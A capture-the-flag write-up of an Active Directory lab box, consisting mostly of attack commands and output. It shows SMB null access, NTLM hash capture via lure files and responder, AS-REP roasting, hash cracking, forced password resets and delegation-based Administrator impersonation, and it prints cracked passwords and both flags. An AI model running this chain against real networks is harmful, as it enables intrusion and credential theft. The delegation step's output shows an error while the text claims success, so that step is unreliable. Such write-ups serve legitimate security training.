# CTF Writeup: Reset

---

## Reconaissance

An initial scan revealed which services are open:

```
nmap -n -Pn -sS -p- 10.10.195.182                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 03:17 CDT
Nmap scan report for 10.10.195.182
Host is up (0.035s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49702/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 157.73 seconds
```

An detailled service version detection scan revealed more information:

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,7680,9389,49669,49670,49671,49673,49676,49702 10.10.195.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 03:22 CDT
Nmap scan report for 10.10.195.182
Host is up (0.035s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-15 08:22:43Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-09-14T08:13:56
|_Not valid after:  2026-03-16T08:13:56
|_ssl-date: 2025-09-15T08:24:15+00:00; +4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-15T08:23:35+00:00
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  filtered pando-pub
9389/tcp  open     mc-nmf        .NET Message Framing
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open     msrpc         Microsoft Windows RPC
49676/tcp open     msrpc         Microsoft Windows RPC
49702/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-time: 
|   date: 2025-09-15T08:23:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.67 seconds
```

Since we retrieved the Domain IP of the AD, we will map 10.10.195.182 to HayStack.thm.corp 

```
sudo echo "10.10.195.182 HayStack.thm.corp" | sudo tee -a /etc/hosts
```

My first initiative is to scan for SMB Shares

```
smbclient -L \\\\HayStack.thm.corp\\                                
Password for [WORKGROUP\unkn0wn]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to HayStack.thm.corp failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We were able to list SMB Shares with null access.
Let's try if I can access one of those shares with null access aswell.

```
smbclient \\\\HayStack.thm.corp\\Data
```

Was able to access this share with null access and retrieved files and a password

```
cat nk0ndkcm.nza.txt 
Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team
```
Password: ResetMe123!

Our next initiative should be to try to scan for user accounts, we can utilize nmap.

```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="thm.corp", userdb=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt 10.10.173.0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 07:18 CDT
Unable to split netmask from target expression: "userdb=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
Nmap scan report for thm.corp0 (10.10.173.0)
Host is up (0.034s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     guest@thm.corp
|_    administrator@thm.corp

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

Utilized guest access to bruteforce user accounts with netexec.

```
nxc smb 10.10.220.34 -u guest -p '' --rid-brute
```

Cut usernames that they can be utilized within an wordlist "users.txt"

The name of the files within the SMB Share seem to change all the time, there seems to be some running cronjob or scheduler on higher privs running. Maybe we can intercept his NTLM Hash by utilizing a tool named
"NTML_Theft"


Before running the initial command I have to start up an responder on my current network (tun0) for SMB Servers. 

```
sudo responder -I tun0 -v 
```
```
python3 /home/unkn0wn/Desktop/Tools/ntlm_theft/ntlm_theft.py -g all -s 10.21.156.104 -f test
```

Make sure you are in your test folder, in which all the NTLM Hash Stealer Files are. Navigate into Data's SMB Share and make the following commands:

```
prompt false
mput *
```

Retrieved NTLM Hash of user AUTOMATE

Cracked hash utilizing john the ripper and rockyou.txt wordlist.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd1        (AUTOMATE)     
1g 0:00:00:00 DONE (2025-09-15 13:40) 5.882g/s 1337Kp/s 1337Kc/s 1337KC/s bossdog..920227
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Logged into user via evil-winrm

```
evil-winrm -i 10.10.220.34 -u AUTOMATE -p Passw0rd1
```

Retrieved user.txt in C:\Users\automate\Desktop

```
THM{AUTOMATION_WILL_REPLACE_US}
```

Since there is multiple users including the Administrator on the machine, I'm assuming this machine will have to be done by doing Lateral
Movement.

I tried to get more credentials of users, by utilizing ASREP-Roasting with GetNPUsers.py

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.corp/ -no-pass -usersfile ../Exploiting/OSCP_Prep/THM/ActiveDirectory/Reset/users.txt 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User HAYSTACK$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User 3091731410SA doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:5e34b70f563b889635891e2faf529749$29423a0e18caa55a808caafabfb22a5752d98428f9243f20751df1cd9e936f9a1b30670655d98540b55ffc8d37d864be0132e37ad8d39b1c02d871a6ccc08cef5dbe7cd1ff639ca3077e8986fee82fb5bba2a62386dced33c281ca1959a45f8637375426b1f6cf0b7164b1bf7e206b06d49dc5cc22203df35eec793a653a07297d4bc77aa0bc9da9b1bb46c01d7d0de62a975f726cc4611ca4e14347b996ffae0a4ee7bd591cc7958d1a676d816d64946bc6a30b01a8a6a217745fb0ed8153da918c1ef04822677d5bb5b14b8545fe24e3df462bcc1d6136eac1067ff76170330b6b6644
[-] User TRACY_CARVER doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CECILE_WONG doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CYRUS_WHITEHEAD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DEANNE_WASHINGTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ELLIOT_CHARLES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MICHEL_ROBINSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MITCHELL_SHAW doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FANNY_ALLISON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JULIANNE_HOWE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROSLYN_MATHIS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DANIEL_CHRISTENSEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARCELINO_BALLARD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CRUZ_HALL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HOWARD_PAGE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User STEWART_SANTANA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LINDSAY_SCHULTZ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$TABATHA_BRITT@THM.CORP:d407fcee723f4d5e8e458c90edfe9335$1fe6b6739933fb18bed099af3a7e0da2d6cda8276b9c3b25a3cf84a39cd550931d1351850af9acddc95c81464efdb608bbe530d7b0bf96310b00f0649f5df133e7848dbd09f2cedf035a8674e75a9f0bd3f808c59c61e3666bf9af74807635be01ac096af3c03869564c2f1488e2ec2cafffdcfaccb4e3f475ebd534848d1ea758aed0c78c49ac2425ac7868ceec4025698cbde40c117a1353debe33c8750e8ba56401bb1396c1af75e37d0dc54195b6cf0411f2945abc157a9f5db68bd7686a20962b8df7a3275d9a980ad9afc6d94272a83ef548e1d88b9c56faf5785855227d460ee8
[-] User RICO_PEARSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARLA_WINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ANDY_BLACKWELL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CHERYL_MULLINS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LETHA_MAYO doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HORACE_BOYLE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CHRISTINA_MCCORMICK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3811465497SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MORGAN_SELLERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARION_CLAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3966486072SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TED_JACOBSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUGUSTA_HAMILTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TREVOR_MELTON doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$LEANN_LONG@THM.CORP:38077717947b951b3d06394c93ad839a$2ea0e8241d47feca68b26a719086f2fcf53b03199c168ca96a5be8c46c5c05d40b3aa923d33c2d735967d46160849971195a622c8648ced8cdc618fcb1b56534694c991b97bd7112996ca2daf7b481f1ab63b6fec011e6ba132e5c9bce112c27321442a5c50d3d20ec07ce2cb81d2d956eb57829ad783bca001688fc640bae03b9814f8c1933f6ff582578eeddfef2389c3094a20f48b3782fdd7b0e59610dd4d4624fd0d17f71842ad52b72e35ed00fcba3684b6076a75e73b8f282d4ec5b993fc24fecd562d8cac341a8e1bb44a83a4c045adc46a5ceeb196050dc32f238d3bd2f79f2
[-] User RAQUEL_BENSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User AUTOMATE doesn't have UF_DONT_REQUIRE_PREAUTH set
```

gained Hashes of LEANN_LONG, TABATHA_BRITT & ERNESTO_SILVA

Cracked hashes utilizing john the ripper --> Gained credentials
TABATHA_BRITT:marlboro(1985)

```
john Tabatha_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
marlboro(1985)   ($krb5asrep$23$TABATHA_BRITT@THM.CORP)     
1g 0:00:00:02 DONE (2025-09-15 14:08) 0.3355g/s 1934Kp/s 1934Kc/s 1934KC/s marlenne09..marlandivan
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Privilege Escalation

Since we have now privileges over an domain account, we can potentially
find the hierarchy and exploit methodology to gain high privs. Utilizing bloodhound and neo4j.
First thing I did was analyzing the domain and saving all informations in .json files

```
bloodhound-python -d thm.corp -u TABATHA_BRITT -p 'marlboro(1985)' -ns 10.10.82.118 -c all
```

I started up neo4j

```
sudo neo4j console
```

and also started up my bloodhound

```
bloodhound
```

Since we already have credentials for user tabatha, I searched here up
and marked her as owned.

Pressed right click on tabatha and scrolled down to outbound object control, analyzed the paths further and found out darla_winters as destination.

##### GenericAll + ForceChangePassword Exploitation

The following command will change the password 
```
rpcclient -U 'THM.CORP\TABATHA_BRITT%marlboro(1985)' 10.10.82.118 \
-c 'setuserinfo2 SHAWNA_BRAY 23 "ABC123!@#"'
```

To confirm the password change, we can utilize nxc.

```
nxc smb HayStack.thm.corp -u 'SHAWNA_BRAY' -p 'ABC123!@#'
SMB         10.10.82.118    445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.82.118    445    HAYSTACK         [+] thm.corp\SHAWNA_BRAY:ABC123!@#
```
```
rpcclient -U 'THM.CORP\SHAWNA_BRAY%ABC123!@#' 10.10.82.118 \
-c 'setuserinfo2 CRUZ_HALL 23 "ABC123!@#"'
```
```
rpcclient -U 'THM.CORP\CRUZ_HALL%ABC123!@#' 10.10.82.118 \
-c 'setuserinfo2 DARLA_WINTERS 23 "ABC123!@#"'
```

Since BloodHound already gave us the information that DARLA_WINTERS
is able to delegate into HayStack.thm.corp we can utilize following command:

```
impacket-getST thm.corp/DARLA_WINTERS:'ABC123!@#' \
-spn cifs/thm.corp \ 
-impersonate Administrator \
-dc-ip 10.10.82.118
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user DARLA_WINTERS does not have constrained delegation permisions or impersonated user does not exist
```

We gained this file on our local machine now:

Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache

Next step is to export it:

```
export KRB5CCNAME=./Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
```

Logging into the Administrator account:

```
impacket-wmiexec -k -no-pass THM.CORP/Administrator@HayStack.thm.corp   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
THM{RE_RE_RE_SET_AND_DELEGATE}
```
